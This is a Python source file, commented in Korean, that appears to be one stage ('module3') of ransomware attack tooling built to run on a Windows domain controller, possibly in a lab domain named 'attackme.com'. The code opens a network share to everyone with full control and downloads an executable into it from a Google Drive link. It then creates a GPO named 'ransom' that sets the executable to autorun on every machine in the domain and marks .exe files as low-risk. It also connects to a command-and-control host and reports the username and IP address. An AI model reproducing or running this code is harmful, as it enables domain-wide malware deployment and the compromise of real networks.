# module3(Domain Controller)
# algorithm
# 1. 공유 폴더 존재 여부 확인
# 2. 공유 폴더 부재 시 공유 폴더 생성 / 존재 시 본인 자가 삭제
# 3. 공유 폴더에 module4 다운로드
# 4. GPO를 통해 module4 실행

import os
import socket
import getpass
import os.path
import platform
import threading
import subprocess
import urllib.request
import time

# 0.1 OS
a = platform.platform
# 0.2 PC name
b = platform.node
# 0.3 Username
c = getpass.getuser()
# 0.4 Download file
d = "proto_M4.exe"
# 0.5 IP
s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
s.connect(("8.8.8.8", 80))
e = s.getsockname()[0]
# 0.6 current file name
dri = os.path.basename(__file__)
info_List = []

# 1. communication moudule
#모든 행위 끝내고 OS, NODE 전송

# 2. create share folder
def file_create():
    try:
        cmd1 = "powershell.exe mkdir C:\\users\\{}\\desktop\\share2".format(c)
        cmd2 = "net share share2=C:\\users\\{}\\desktop\\share2 \"/GRANT:everyone,FULL\"".format(c)
        cmd3 = "icacls \"C:\\users\\{}\\desktop\\share2\" /t /grant \"everyone:(OI)(CI)F\"".format(c)

        subprocess.call(cmd1)
        subprocess.call(cmd2)
        subprocess.call(cmd3)
        
        info_List.append(('Create share folder','Ok'))
    except:
        info_List.append(('Create share folder','No'))

# 3. download module4
def file_download():
    try:
        #url ="https://drive.google.com/uc?export=download&id=1Ub28UGDxkDkbnqWLREts3pWNB84iR-FM"
        url ="https://drive.google.com/uc?export=download&id=12KxdrUk2Rs2GTL3sKDJikjtKvdxBuI0O"
        path="C:/Users/{}/Desktop/share2/".format(c) + d

        urllib.request.urlretrieve(url, path)
        
        info_List.append(('Download Module4','Ok'))
    except:
        info_List.append(('Download Module4','No'))


# 4. add GPO
def gpo_add():
    try:
        cmd1 = "powershell.exe new-gpo -name \"ransom\""
        cmd2 = "powershell.exe Set-GPRegistryValue -Name \"ransom\" -Key \"HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\" -valuename clopransom -type string -value \"\\\{}\share2\{}\"".format(e, d)    
        cmd3 = "powershell.exe set-gpregistryvalue -Name \"ransom\" -Key \"HKEY_CURRENT_USER\\Software\\Microsoft\Windows\\CurrentVersion\\policies\\associations\" -valuename LowRiskFileTypes -type string -value \".exe\""
        cmd4 = "powershell.exe \"new-gplink -Name \\\"ransom\\\" -Target \\\"dc=attackme,dc=com\\\"\""
        # 문제가 되는 부분. 각 그룹을 자동 탐색할 수 있게 해야함. 혹은 기존 디폴트 그룹정책에 등록?
        cmd5 = "powershell.exe gpupdate /force"

        subprocess.call(cmd1)
        subprocess.call(cmd2)
        subprocess.call(cmd3)
        subprocess.call(cmd4)
        subprocess.call(cmd5)

        info_List.append(('Add GPO','Ok'))
    except:
        info_List.append(('Add GPO','No'))


# 6. Communication module
def Socket_Create():
    Host = '192.168.56.1'
    Port = 9999

    global Client_Socket

    Client_Socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    Client_Socket.connect((Host, Port))

    receive_thread = threading.Thread(target=info_send)
    receive_thread.start()

def info_send():
    print('info_send start')
    while True:
        try:
            msg = Client_Socket.recv(1024).decode('ascii')
            if msg == 'MODULENAME':
                Client_Socket.send(c.encode('ascii'))
                print('send MODULENAME')
            elif msg == 'MODULEIP':
                Client_Socket.send(e.encode('ascii'))
            elif msg == 'M_INFOLIST':
                info_Lists = make_List(info_List)
                Client_Socket.send(info_Lists.encode('ascii'))
            else:
                print(msg)
        except Exception as error:
            print("Error!",error)
            Client_Socket.close()
            break

def make_List(info_List):
    info_Lists = '[M3]\n'
    for info_name, info_state in info_List:
        info_List = info_name + ': ' + info_state + '\n'
        info_Lists += info_List
    return info_Lists

# 7. main algorithm
file = 'C:\\users\\{}\\desktop\\share2'.format(c)

if os.path.isdir(file):
    print("file exist")
    exit(1)

else :
    print("no file")
    #main() # OS, NODE 저장 후 전송
    file_create()
    file_download()
    gpo_add()

Socket_Create()

# issue
# 2. 통신 모듈 추가
# 자가삭제 -> module3(1) 로 숫자 붙는 이름 어떻게 삭제할건지 계획
# DC에서 모듈4 직접 실행해야함(이 부분 알고리즘 탐색 필요)
# GPO 그룹 절대경로 해결해야함
# 침투 성공의 기준을 정해야함
    # 1. module4의 실행 // 모든 PC 재시작까지 언제 기다려?
    
    # 2. GPO의 등록(완료되면) -> DC moduleX -> module1 성공했다. 전송
    # 3. 

# release
# C2 경로 수정
# 자가 삭제 경로 수정
# 다운로드 파일 정의 수정 -> url 절대 경로 지정
# print("file exist") 삭제
# 